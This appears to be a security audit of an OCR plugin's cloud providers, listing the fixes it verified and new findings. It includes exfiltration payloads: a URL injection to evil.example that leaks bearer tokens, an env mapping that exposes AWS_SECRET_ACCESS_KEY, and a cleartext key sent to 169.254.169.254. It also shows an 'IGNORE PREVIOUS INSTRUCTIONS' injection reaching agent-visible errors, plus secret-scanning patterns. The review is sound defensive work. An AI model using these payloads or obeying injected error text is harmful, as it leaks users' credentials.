# Security review, slice 1 (BYO OCR)

Scope: ocr_providers.py, ocr_cloud.py, pdf_front.py diff, harness/openbooks.providers.toml, harness/bench/ocr_compare.py, README section "Bring your own OCR". Proofs were run with fake transports; no network, no keys.

## Prior fixes: verified

| Fix | Result |
|---|---|
| Remote gate bypass via toml | HOLDS. ocr_providers.py:363-365 needs settings.allow_remote AND OPENBOOKS_ALLOW_REMOTE_OCR=1. Proof: azure engine with remote=false and allow_remote=true is CapabilityRefused without the env var, and builds only with it. Fallback goes through _build_engine (line 406), so it is gated too. |
| cwd toml lookup | HOLDS. _find_providers_file uses only the env path or the repo-relative shipped file. |
| Azure key egress via Operation-Location | HOLDS (ocr_cloud.py:226). Scheme, host and port must match the endpoint. Proof: a foreign origin is refused before any GET. It also refuses :443 against an implicit port (false positive only). |
| POST retries | HOLDS. POST retries only on 429 (_send, line 94). |
| Redirects | HOLDS. _RefuseRedirects turns a redirect into a 3xx status, which raises. |
| Textract timeouts | HOLDS (botocore Config). |
| Mistral/LlamaParse fallback | HOLDS. CapabilityRefused is re-raised, so there is no silent fallback and no image is sent. |

## Findings

### HIGH-1: Google URL injection exfiltrates the bearer token
ocr_cloud.py:276. location, project and processor come from toml options and are interpolated unvalidated into the URL host.
Exploit: location = "evil.example/x#" gives https://evil.example/x#-documentai.googleapis.com/... Proof: the request goes to evil.example with the Authorization bearer header. A PR or shared providers file triggers it once the user sets OPENBOOKS_ALLOW_REMOTE_OCR=1.
Fix: validate location with ^[a-z]+(-[a-z0-9]+)*$ and project/processor with ^[A-Za-z0-9_-]+$ (ConfigError otherwise). Then assert urlsplit(url).hostname ends with .googleapis.com.

### HIGH-2: env table can name any environment variable
ocr_providers.py:150, ocr_cloud.py:168-173. The slot-to-name map is unrestricted.
Exploit: [providers.g.env] token = "AWS_SECRET_ACCESS_KEY" plus HIGH-1 sent the AKIA value as the bearer header (proved). Azure has the same exposure through a repo-controlled endpoint variable.
Fix: allowlist env names per engine (azure: AZURE_DOCINTEL_KEY and _ENDPOINT; google: GOOGLE_DOCAI_ACCESS_TOKEN; and so on). Reject the rest with ConfigError.

### HIGH-3: Azure endpoint has no scheme or host validation
ocr_cloud.py:215. http://169.254.169.254 is accepted and the subscription key is sent in cleartext to it (proved: first request URL is http, key header present). file:// and ftp:// also pass through the default opener handlers.
Fix: require https, a hostname, no userinfo, no IP literals or private ranges. Optionally allowlist *.cognitiveservices.azure.com and *.api.cognitive.microsoft.com. Normalise default ports in _origin.

### MEDIUM-1: Secrets with default env names are not redacted by callers
ocr_providers.py:361,390 and ocr_compare.py:296-301 only collect names listed in config.env. If a provider omits the table, the token is read via the default name and is absent from the secrets list (proved: _env_secrets returns []). ocr_compare then redacts and scans nothing for it. _CloudEngine redacts its own messages. Textract passes no secrets, and AWS_SESSION_TOKEN is never listed.
Fix: derive secret names from per-engine defaults plus config.env, including AWS_SESSION_TOKEN. Extend scan_for_keys with AKIA[0-9A-Z]{16}, JWT, ya29. and 32+ hex.

### MEDIUM-2: Remote-controlled exception text reaches agent-visible errors
ocr_cloud.py:196-199 embeds str(error). Proved: a hostile provider response produced "ValueError: invalid literal for int() with base 10: IGNORE PREVIOUS INSTRUCTIONS", which flows into EngineFault and tool output.
Fix: emit only type(error).__name__.

### MEDIUM-3: Engine choice is per page; evidence records only the last page
pdf_front.py:61-68. Each page calls ocr_pages separately and _RUNS.run is overwritten. A mixed-engine document reports one engine, so pages can leave the machine without the evidence saying so.
Fix: accumulate (page, engine_id, used_fallback) per document and expose the list. Resolve the engine once per document.

### MEDIUM-4: remote and cost in ocr_compare come from the toml flag
ocr_compare.py:152. A cloud engine with remote=false is reported remote=False with cost 0.0 (the gate still blocks it). Use engine.remote or config.engine in CLOUD_ENGINES.

### MEDIUM-5: Unbounded response reads, no cloud spend cap
ocr_cloud.py:81,83. response.read() has no size limit, so a hostile endpoint can exhaust memory, and timeouts are per socket operation. MAX_PAGES=60 bounds pages per document, but nothing bounds paid calls per run. Page pixels are bounded by OCR_MAX_PX=3200 (about 31 MB RGB), which is fine.
Fix: read at most 20 MB (read(N+1) and reject) and add a remote page budget env var.

### MEDIUM-6: cmd_env lets toml execute any env-named binary
ocr_providers.py:208-211,260. Fix: allow only OPENBOOKS_TESSERACT_CMD. Argv is a list with no shell, and lang/psm are regex-pinned with no leading dash, so there is no argv injection.

### LOW
- L1 README.md:51 says only allow_remote = true is needed; OPENBOOKS_ALLOW_REMOTE_OCR=1 is also required. Code defaults allow_remote to True (ocr_providers.py:168); make it False.
- L2 ocr_providers.py:121: parents[6] from an installed wheel points at an arbitrary ancestor that could hold a planted harness/openbooks.providers.toml. Use it only from a source checkout.
- L3 _reject_secrets ignores table keys and non-matching shapes (JWT, ya29., AKIA is 20 chars). Weak guard; do not rely on it.
- L4 Tesseract path is resolved at init, not re-checked at run (TOCTOU), only exploitable with write access to the path. shutil.which did not pick up cwd on Python 3.13 (proved None); older versions may on Windows. Prefer absolute paths.
- L5 ocr_compare.py:290: float(value) in load_prices can raise an uncaught TypeError traceback (no secrets). ProxyHandler honours HTTP(S)_PROXY, so an http endpoint goes via the proxy in cleartext (fixed by HIGH-3).
- L6 Optional imports (boto3, PIL, easyocr, torch) resolve via sys.path; a stray boto3.py in the cwd shadows it when running python -m bench from there. boto3 is in no extra and unpinned; add a pinned ocr-cloud extra.
- L7 redact() over-redacts short values (for example the AWS_REGION value).

## Clean checks
- No temp files for page images: tesseract gets PNG on stdin, cloud sends bytes in memory. Only core/output.py uses mkstemp, unrelated.
- Result JSON carries only provider id, status, codes, latencies, doc names and reasons. Reasons go through redact_tree and scan_for_keys. No traceback is printed (except Exception stores the type name only).
- Document text prompt injection: OCR Word.text flows only into parsers. Error strings are the only free-text path (MEDIUM-2). _validate_word bounds coordinates and confidence.
